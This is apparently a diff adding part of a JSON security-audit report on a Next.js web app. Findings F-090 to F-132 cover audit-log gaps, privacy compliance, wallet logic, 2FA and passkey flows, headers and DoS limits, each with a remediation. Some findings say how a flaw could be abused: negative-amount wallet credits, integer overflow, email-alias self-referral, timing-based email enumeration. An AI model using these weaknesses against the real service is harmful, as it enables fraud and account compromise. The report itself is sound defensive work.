+      "title": "No age gate / parental-consent flow (children)",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "minors"
+      ],
+      "affected_panels": [
+        "signup"
+      ],
+      "categories": [
+        "Cat 27"
+      ],
+      "location": {
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "function": "missing"
+      },
+      "description": "No date-of-birth check; minors (under 18 in DPDP, under 16 in GDPR) can sign up freely.",
+      "business_impact": "DPDP / GDPR Art. 8 non-compliance; potential fines for processing children's data.",
+      "remediation": "Self-attested DOB at signup; parental-consent flow for under-18 (verifiable parent email + click-confirmation)."
+    },
+    {
+      "id": "F-091",
+      "title": "No breach-notification capability codified in repo",
+      "severity": "Medium",
+      "cwe": "CWE-755",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 27"
+      ],
+      "location": {
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "function": "missing"
+      },
+      "description": "No tooling/runbook in repo for the 72h DPDP/GDPR breach-notification deadline.",
+      "business_impact": "Inability to meet 72h breach-notification window; regulatory penalty risk.",
+      "remediation": "Document the runbook; integrate with status-page / ticketing."
+    },
+    {
+      "id": "F-092",
+      "title": "Wallet operations log to WalletTransaction only; no AuditLog (financial-audit gap)",
+      "severity": "Medium",
+      "cwe": "CWE-778",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "wallet"
+      ],
+      "categories": [
+        "Cat 7",
+        "Cat 12",
+        "Cat 25",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "lib/wallet.ts",
+        "line_start": 28,
+        "line_end": 262,
+        "function": null
+      },
+      "description": "WalletTransaction is a data table (the ledger), not an audit table. No way to forensically reconstruct who triggered each grant/spend (especially for adminAdjust \u2014 it stores description but not actor email reliably).",
+      "business_impact": "Financial-audit gap; insider self-grants invisible; chain with F-022 catastrophic.",
+      "remediation": "Add logAudit calls inside earnReward, spendPoints, adminAdjust, expirePoints. Include actor email, target email, amount, before/after balance."
+    },
+    {
+      "id": "F-093",
+      "title": "Member status / tag updates not audited",
+      "severity": "Medium",
+      "cwe": "CWE-778",
+      "affected_roles": [
+        "all admins"
+      ],
+      "affected_panels": [
+        "/core/members"
+      ],
+      "categories": [
+        "Cat 25"
+      ],
+      "location": {
+        "file": "app/api/members/[id]/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "PATCH on /api/members/[id] (status, tags) does not write AuditLog.",
+      "business_impact": "Member-state changes invisible to audit; insider risk on tag/status manipulation.",
+      "remediation": "Add logAudit({ action: 'MEMBER_UPDATE', changes: diff(before, after) })."
+    },
+    {
+      "id": "F-094",
+      "title": "2FA enable/disable / passkey register actions not audited",
+      "severity": "Medium",
+      "cwe": "CWE-778",
+      "affected_roles": [
+        "all users"
+      ],
+      "affected_panels": [
+        "/me/2fa"
+      ],
+      "categories": [
+        "Cat 25"
+      ],
+      "location": {
+        "file": "app/api/me/2fa/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Auth-strength changes are unaudited.",
+      "business_impact": "Compromise pattern (attacker disables 2FA after takeover) leaves no trace.",
+      "remediation": "Audit all 2FA mutations."
+    },
+    {
+      "id": "F-095",
+      "title": "Swag redemption (SwagOrder.create) not audit-logged",
+      "severity": "Medium",
+      "cwe": "CWE-778",
+      "affected_roles": [
+        "all users"
+      ],
+      "affected_panels": [
+        "/swag"
+      ],
+      "categories": [
+        "Cat 25"
+      ],
+      "location": {
+        "file": "app/api/swag/[id]/redeem/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Only SwagOrder row + WalletTransaction; no AuditLog.",
+      "business_impact": "Fraudulent redemptions invisible to audit pipeline.",
+      "remediation": "logAudit({ action: 'SWAG_REDEEM' })."
+    },
+    {
+      "id": "F-096",
+      "title": "Public monitoring endpoints (/api/monitoring/*, /api/health) leak deployment internals",
+      "severity": "Medium",
+      "cwe": "CWE-200",
+      "affected_roles": [
+        "anonymous"
+      ],
+      "affected_panels": [
+        "public"
+      ],
+      "categories": [
+        "Cat 10",
+        "Cat 25"
+      ],
+      "location": {
+        "file": "app/api/health/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "/api/health and /api/monitoring/* return version, dependency status, and possibly DB stats to anonymous callers.",
+      "business_impact": "Reconnaissance aid; version-fingerprinting eases CVE targeting.",
+      "remediation": "Gate /api/monitoring/* to authenticated CORE only; /api/health returns minimal { ok: true } to anonymous."
+    },
+    {
+      "id": "F-097",
+      "title": "Pagination cursor IDs readable in response (minor enumeration aid)",
+      "severity": "Medium",
+      "cwe": "CWE-200",
+      "affected_roles": [
+        "any caller"
+      ],
+      "affected_panels": [
+        "multiple list endpoints"
+      ],
+      "categories": [
+        "Cat 2",
+        "Cat 4"
+      ],
+      "location": {
+        "file": "Multiple list endpoints",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Cursor-based pagination returns the next-cursor as a raw record ID. Allows enumeration of unowned IDs (mild IDOR aid).",
+      "business_impact": "Mild IDOR aid; ID enumeration easier.",
+      "remediation": "Return opaque cursors (signed {cursor, expiresAt} payload) or HMAC-protected tokens."
+    },
+    {
+      "id": "F-098",
+      "title": "Aggregate / count endpoints return totals across restricted scopes",
+      "severity": "Medium",
+      "cwe": "CWE-200",
+      "affected_roles": [
+        "any caller"
+      ],
+      "affected_panels": [
+        "multiple"
+      ],
+      "categories": [
+        "Cat 2"
+      ],
+      "location": {
+        "file": "app/api/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Some count endpoints return totals across rows the caller cannot read \u2014 leaks existence info.",
+      "business_impact": "Existence leak via count; accelerates targeted enumeration.",
+      "remediation": "Filter aggregate queries by the same WHERE clause as the read query."
+    },
+    {
+      "id": "F-099",
+      "title": "Export endpoint skips per-row permission check (relies on top-level role check only)",
+      "severity": "Medium",
+      "cwe": "CWE-285",
+      "affected_roles": [
+        "CORE"
+      ],
+      "affected_panels": [
+        "/core/speedrun export"
+      ],
+      "categories": [
+        "Cat 2",
+        "Cat 19"
+      ],
+      "location": {
+        "file": "app/api/speedrun/registrations/export/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Top-level role check only; no per-row scoping (e.g., only export rows the caller is responsible for).",
+      "business_impact": "Cross-scope PII export by admins not legitimately involved.",
+      "remediation": "Filter export rows by caller's scope of responsibility (assignedAdmin = session.user.id)."
+    },
+    {
+      "id": "F-100",
+      "title": "Outbound event-application emails include data the recipient shouldn't see (hardcoded recipients)",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "recipients of application notifications"
+      ],
+      "affected_panels": [
+        "/core/applications"
+      ],
+      "categories": [
+        "Cat 2",
+        "Cat 13"
+      ],
+      "location": {
+        "file": "app/api/applications/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Application notification emails are sent to a hardcoded recipient list including PII fields the recipients aren't authorized to see (e.g., applicant phone).",
+      "business_impact": "Cross-recipient PII leak; data-minimization violation.",
+      "remediation": "Send per-recipient summary emails with only the fields each recipient is authorized for; never include raw form-response data in cross-recipient emails."
+    },
+    {
+      "id": "F-101",
+      "title": "Blind prisma.member.update() \u2014 no optimistic concurrency / version column",
+      "severity": "Medium",
+      "cwe": "CWE-362",
+      "affected_roles": [
+        "all admins"
+      ],
+      "affected_panels": [
+        "/core/members"
+      ],
+      "categories": [
+        "Cat 2",
+        "Cat 28",
+        "Cat 29"
+      ],
+      "location": {
+        "file": "app/api/members/[id]/permissions/route.ts",
+        "line_start": 43,
+        "line_end": 46,
+        "function": null
+      },
+      "description": "Two simultaneous PATCHes race; last writer wins, silently overwriting concurrent edits.",
+      "business_impact": "Lost-update / silent overwrite of concurrent admin edits; integrity issue.",
+      "remediation": "Add version: Int @default(0) to Member; require client to send current version; bump on each update; reject mismatch with 409."
+    },
+    {
+      "id": "F-102",
+      "title": "Negative-amount edge case in spendPoints() (no amount > 0 guard; can credit on negative)",
+      "severity": "Medium",
+      "cwe": "CWE-20",
+      "affected_roles": [
+        "any caller of spendPoints"
+      ],
+      "affected_panels": [
+        "wallet"
+      ],
+      "categories": [
+        "Cat 12"
+      ],
+      "location": {
+        "file": "lib/wallet.ts",
+        "line_start": 86,
+        "line_end": 152,
+        "function": "spendPoints"
+      },
+      "description": "if (amount <= 0) guard missing; calling spendPoints(user, -100) credits 100 and decrements totalSpent. Currently no externally-callable route does this, but the primitive is unsafe.",
+      "business_impact": "Currently dormant primitive flaw; future-route addition would expose direct credit fraud.",
+      "remediation": "Add the guard. See F-022."
+    },
+    {
+      "id": "F-103",
+      "title": "Suspected 32-bit Int overflow on UserWallet balance fields",
+      "severity": "Medium",
+      "cwe": "CWE-190",
+      "affected_roles": [
+        "all wallets"
+      ],
+      "affected_panels": [
+        "wallet"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 28"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": 659,
+        "line_end": 706,
+        "function": null
+      },
+      "description": "pointsBalance, totalEarned, totalSpent, totalExpired are Int (32-bit signed). With no input cap (F-022), an admin grant of 1.5B points wraps to negative.",
+      "business_impact": "Balance corruption; ledger integrity violated; chain with F-022 enables silent wraparound.",
+      "remediation": "Migrate to BigInt; or rigorously enforce per-call cap (F-022 mitigation also covers this)."
+    },
+    {
+      "id": "F-104",
+      "title": "No velocity / Sybil check on signup \u2014 unlimited PublicUser creation per IP",
+      "severity": "Medium",
+      "cwe": "CWE-799",
+      "affected_roles": [
+        "any signup"
+      ],
+      "affected_panels": [
+        "auth"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 13,
+        "line_end": 86,
+        "function": null
+      },
+      "description": "Unlimited PublicUser creation per IP. Combined with F-059/F-060/F-061, signup is line-rate.",
+      "business_impact": "Mass signup farming; chain with economy abuse.",
+      "remediation": "5 signups per IP per day; CAPTCHA challenge on suspicious signups."
+    },
+    {
+      "id": "F-105",
+      "title": "Profile-picture URL leaks via Referer header to third parties",
+      "severity": "Low",
+      "cwe": "CWE-200",
+      "affected_roles": [
+        "any user"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 13"
+      ],
+      "location": {
+        "file": "components/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "User avatars hosted on Cloudinary or Vercel Blob load with default Referer policy; on click-through to a third-party site, the avatar URL leaks. Add Referrer-Policy: strict-origin-when-cross-origin (already default on modern browsers \u2014 verify and codify in next.config.ts)."
+    },
+    {
+      "id": "F-106",
+      "title": "TOTP timing window too permissive (\u00b11 period = 90s acceptance window)",
+      "severity": "Low",
+      "cwe": "CWE-294",
+      "affected_roles": [
+        "any 2FA user"
+      ],
+      "affected_panels": [
+        "/me/2fa"
+      ],
+      "categories": [
+        "Cat 11"
+      ],
+      "location": {
+        "file": "lib/totp.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": "TOTP module"
+      },
+      "summary": "Accepts \u00b11 30s period. Total acceptance window = 90s. Recommend window: 1 only on first attempt; tighten to 0 after first successful verification of a session."
+    },
+    {
+      "id": "F-107",
+      "title": "Recovery codes single-use not enforced at DB layer (race window if rapid-replay)",
+      "severity": "Low",
+      "cwe": "CWE-294",
+      "affected_roles": [
+        "any 2FA user"
+      ],
+      "affected_panels": [
+        "/me/2fa"
+      ],
+      "categories": [
+        "Cat 11"
+      ],
+      "location": {
+        "file": "lib/recoveryCodes.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "A rapid-replay race could let the same recovery code be used twice. Application enforces single-use but lacks DB unique constraint or atomic mark-used. Use transactional UPDATE ... WHERE used = false RETURNING * to atomically claim a code."
+    },
+    {
+      "id": "F-108",
+      "title": "Passkey challenge stored in wrong field (design flaw \u2014 usable but brittle)",
+      "severity": "Low",
+      "cwe": "CWE-1390",
+      "affected_roles": [
+        "any passkey user"
+      ],
+      "affected_panels": [
+        "/me/passkeys"
+      ],
+      "categories": [
+        "Cat 11"
+      ],
+      "location": {
+        "file": "app/api/me/passkeys/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Challenge stored alongside credential metadata rather than in a dedicated short-lived store. Functional but fragile; concurrent registration attempts could collide. Store challenges in a Redis-like ephemeral store keyed by session ID, TTL 60s."
+    },
+    {
+      "id": "F-109",
+      "title": "Passkey challenge reused during registration vs authentication",
+      "severity": "Low",
+      "cwe": "CWE-294",
+      "affected_roles": [
+        "any passkey user"
+      ],
+      "affected_panels": [
+        "/me/passkeys"
+      ],
+      "categories": [
+        "Cat 11"
+      ],
+      "location": {
+        "file": "app/api/me/passkeys/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Same challenge value used for register and authenticate flows. WebAuthn spec requires fresh randomness per ceremony. Generate a new challenge for each ceremony; bind challenge to ceremony type."
+    },
+    {
+      "id": "F-110",
+      "title": "Account-enumeration timing in signIn callback (enumerate registered emails)",
+      "severity": "Low",
+      "cwe": "CWE-204",
+      "affected_roles": [
+        "anyone"
+      ],
+      "affected_panels": [
+        "auth"
+      ],
+      "categories": [
+        "Cat 11"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 13,
+        "line_end": 86,
+        "function": "signIn"
+      },
+      "summary": "signIn for known emails takes longer (extra DB writes) than for unknown \u2014 measurable timing oracle. Mitigated by Google OAuth gate but still a fingerprintable side channel. Pad timing with setTimeout or perform a dummy work step on the unknown-email path."
+    },
+    {
+      "id": "F-111",
+      "title": "CORS / cross-origin headers minimal \u2014 no explicit Access-Control response",
+      "severity": "Low",
+      "cwe": "CWE-942",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 10"
+      ],
+      "location": {
+        "file": "next.config.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "No explicit CORS policy in headers. Default Next.js behavior is same-origin only (correct), but missing the explicit Access-Control-Allow-Origin makes audits flag it. Explicitly emit Access-Control-Allow-Origin: <origin> for /api/* routes; deny by default."
+    },
+    {
+      "id": "F-112",
+      "title": "X-XSS-Protection legacy header missing (defense-in-depth only)",
+      "severity": "Low",
+      "cwe": "CWE-1021",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 10"
+      ],
+      "location": {
+        "file": "next.config.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Modern browsers ignore this header (use CSP instead) but older browsers and pen-test reports still flag it. Add X-XSS-Protection: 0 (explicit disable, OWASP-recommended modern stance)."
+    },
+    {
+      "id": "F-113",
+      "title": "Permissions-Policy minimal \u2014 no explicit camera/mic/geo deny",
+      "severity": "Low",
+      "cwe": "CWE-1021",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 10"
+      ],
+      "location": {
+        "file": "next.config.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "No Permissions-Policy header denying camera/mic/geolocation/USB. App doesn't currently use these, so attacker-injected scripts could opportunistically use them. Add Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=(), browsing-topics=()."
+    },
+    {
+      "id": "F-114",
+      "title": "CSV export Content-Type missing for XSS prevention",
+      "severity": "Low",
+      "cwe": "CWE-79",
+      "affected_roles": [
+        "CORE downloading export"
+      ],
+      "affected_panels": [
+        "/core/speedrun"
+      ],
+      "categories": [
+        "Cat 19"
+      ],
+      "location": {
+        "file": "app/api/speedrun/registrations/export/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Without Content-Type: text/csv and Content-Disposition: attachment, browsers may sniff and render as HTML, executing payloads in cells. Set both headers explicitly."
+    },
+    {
+      "id": "F-115",
+      "title": "Service Worker version not pinned \u2014 cache poisoning by stale SW after deploy rollback",
+      "severity": "Low",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "all PWA users"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 15",
+        "Cat 26"
+      ],
+      "location": {
+        "file": "public/sw.js",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "If a deploy is rolled back, the new SW (older code) might serve cached responses from the newer-but-rolled-back version. Embed a build-hash in the SW filename and the cache-name; client checks navigator.serviceWorker.register('/sw-${buildHash}.js')."
+    },
+    {
+      "id": "F-116",
+      "title": "PWA manifest icon paths fetched without integrity check",
+      "severity": "Low",
+      "cwe": "CWE-353",
+      "affected_roles": [
+        "all PWA users"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 15"
+      ],
+      "location": {
+        "file": "public/manifest.json",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Manifest icons load over HTTPS but no SRI / hash. Tampering at the CDN edge would be undetected. Pin icons to the same-origin and use long-lived immutable cache headers; periodically verify hash."
+    },
+    {
+      "id": "F-117",
+      "title": "Speedrun referral self-exploitation via email aliasing \u2014 increments conversions",
+      "severity": "Low",
+      "cwe": "CWE-345",
+      "affected_roles": [
+        "any registrant"
+      ],
+      "affected_panels": [
+        "/speedrun"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/speedrun/runs/[slug]/register/route.ts",
+        "line_start": 141,
+        "line_end": 154,
+        "function": null
+      },
+      "summary": "Self-referral check compares emails strictly; aliasing bypass per F-059. Currently only inflates conversions counter (no rewards). Normalize emails (F-059); explicitly reject self-referral by normalized email."
+    },
+    {
+      "id": "F-118",
+      "title": "Member.name lacks DB length cap (Vercel 2 MB body cap is the only ceiling)",
+      "severity": "Low",
+      "cwe": "CWE-400",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 28"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Vercel's 2 MB body cap is the only ceiling; very-long names could bloat list responses. Add @db.VarChar(200) on Member.name and similar fields."
+    },
+    {
+      "id": "F-119",
+      "title": "Prisma JSON parsing without zod for some fields (type coercion)",
+      "severity": "Low",
+      "cwe": "CWE-20",
+      "affected_roles": [
+        "any caller"
+      ],
+      "affected_panels": [
+        "multiple"
+      ],
+      "categories": [
+        "Cat 28"
+      ],
+      "location": {
+        "file": "Multiple routes",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "A few routes accept req.body and pass JSON fields directly to Prisma without zod parsing \u2014 type-coercion attacks possible. Add zod schemas everywhere user input enters Prisma."
+    },
+    {
+      "id": "F-120",
+      "title": "No global request size limit beyond Vercel default (4.5 MB / 2 MB body)",
+      "severity": "Low",
+      "cwe": "CWE-770",
+      "affected_roles": [
+        "any caller"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 21"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "4.5 MB POST body cap is the only protection. Add per-route bodyParser.sizeLimit in handlers (Next.js route config); keep small (32 KB for most routes, 5 MB for upload-handler)."
+    },
+    {
+      "id": "F-121",
+      "title": "ReDoS risk in input validation regex (one suspicious pattern)",
+      "severity": "Low",
+      "cwe": "CWE-1333",
+      "affected_roles": [
+        "any caller"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 21"
+      ],
+      "location": {
+        "file": "lib/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "One suspicious nested-quantifier regex pattern was flagged. Audit; rewrite without nested quantifiers; use safe-regex lint rule."
+    },
+    {
+      "id": "F-122",
+      "title": "Data-grid endpoint fetches all records without pagination (potential DoS)",
+      "severity": "Low",
+      "cwe": "CWE-770",
+      "affected_roles": [
+        "CORE"
+      ],
+      "affected_panels": [
+        "data-grid"
+      ],
+      "categories": [
+        "Cat 21"
+      ],
+      "location": {
+        "file": "app/api/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "A specific data-grid backend pulls all rows (no take/skip). DoS via 100k+ rows. Enforce server-side pagination; cap at 100 rows per request."
+    },
+    {
+      "id": "F-123",
+      "title": "Bounty.cash field unbounded (admin typo can over-budget; not strictly a CVE)",
+      "severity": "Low",
+      "cwe": "CWE-20",
+      "affected_roles": [
+        "FULL_ACCESS admins"
+      ],
+      "affected_panels": [
+        "/core/bounty"
+      ],
+      "categories": [
+        "Cat 30"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Admin can typo a 7-figure cash bounty. Cap at a configurable max (\u20b91,00,000?); require dual-control above cap."
+    },
+    {
+      "id": "F-124",
+      "title": "Indexes missing on 3 high-cardinality query patterns (LOW-MEDIUM perf, DoS adjacent)",
+      "severity": "Low",
+      "cwe": "CWE-407",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 23"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Three query patterns lack supporting indexes (per Cat 23 scan). DoS-adjacent: an attacker repeating a slow query can saturate the DB. Add indexes per Cat 23 recommendations."
+    },
+    {
+      "id": "F-125",
+      "title": "Vercel Analytics userEmail field may violate GDPR if user identifies as analytics actor",
+      "severity": "Info",
+      "affected_roles": [
+        "EU/UK users"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 27"
+      ],
+      "location": {
+        "file": "app/layout.tsx",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "If the app calls track({ user_email }) (Vercel Analytics custom property), it ships PII to Vercel's analytics DB. Use hashed user-id; never raw email.",
+      "cwe": "CWE-359"
+    },
+    {
+      "id": "F-126",
+      "title": "Plaintext offline IndexedDB data not wiped when consent withdrawn",
+      "severity": "Info",
+      "affected_roles": [
+        "all PWA users"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 15",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "lib/offlineStorage.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "On consent-withdrawal or logout, IndexedDB is not cleared; PII in cached actions persists on the device. On logout, call indexedDB.deleteDatabase('team1india-offline').",
+      "cwe": "CWE-359"
+    },
+    {
+      "id": "F-127",
+      "title": "Cron schedule trigger discoverable via vercel.json exposure (no secret in path)",
+      "severity": "Info",
+      "affected_roles": [
+        "anyone"
+      ],
+      "affected_panels": [
+        "cron"
+      ],
+      "categories": [
+        "Cat 17",
+        "Cat 26"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Cron paths are public knowledge (in committed vercel.json). Slightly aids brute-force on F-003 (cron secret). N/A \u2014 Vercel requires paths be in vercel.json. Compensate by strengthening cron auth (F-003).",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "F-128",
+      "title": "Source maps not generated in production (good \u2014 flagged as info confirm)",
+      "severity": "Info",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 9",
+        "Cat 16",
+        "Cat 26"
+      ],
+      "location": {
+        "file": "next.config.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "productionBrowserSourceMaps is not set (defaults to false). Confirm continued; add a CI assertion productionBrowserSourceMaps !== true to prevent regression.",
+      "cwe": "CWE-540"
+    },
+    {
+      "id": "F-129",
+      "title": "SMTP DSN exposed via NEXT_PUBLIC_SENTRY_DSN \u2014 DSN itself is non-secret but signals integration",
+      "severity": "Info",
+      "affected_roles": [
+        "anyone"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 25"
+      ],
+      "location": {
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "function": "client bundle"
+      },
+      "summary": "DSN is a public identifier by design; the only risk is quota-exhaustion via fake events. However, per F-034, Sentry is dormant \u2014 so the DSN exposure is purely signaling without monitoring benefit. Either initialize Sentry (F-034) or remove the env var.",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "F-130",
+      "title": "NEXT_PUBLIC_ADMIN_EMAIL / NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT exposed (phishing surface)",
+      "severity": "Info",
+      "affected_roles": [
+        "anyone"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 16"
+      ],
+      "location": {
+        "file": null,
+        "line_start": null,
+        "line_end": null,
+        "function": "client bundle"
+      },
+      "summary": "Admin email + admin endpoint URL in bundle. Phishing attackers learn who to target and where the admin endpoint lives. Move to server-only env vars; expose only via server-rendered pages where needed.",
+      "cwe": "CWE-200"
+    },
+    {
+      "id": "F-131",
+      "title": "OAuth domain-based auto-promotion not implemented (good \u2014 flagged as confirmation)",
+      "severity": "Info",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "auth"
+      ],
+      "categories": [
+        "Cat 3"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Common foot-gun: auto-grant admin to @company.com emails. Confirmed not present \u2014 defaults to PUBLIC tier. None; codify the absence with a regression test."
+    },
+    {
+      "id": "F-132",
+      "title": "Background job inheriting elevated permissions (covered as system role)",
+      "severity": "Info",
+      "affected_roles": [
+        "cron"
+      ],
+      "affected_panels": [
+        "cron"
+      ],
+      "categories": [
+        "Cat 2",
+        "Cat 3"
+      ],
+      "location": {
+        "file": "app/api/cron/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "summary": "Cron handlers run as a system actor with full DB access \u2014 design intent. Re-stated for completeness; the security boundary here is CRON_SECRET (F-003) and AuditLog (F-013). Treat cron secret rotation and per-job AuditLog as mitigations (chained).",
+      "cwe": "CWE-269"
+    }
+  ]
+}
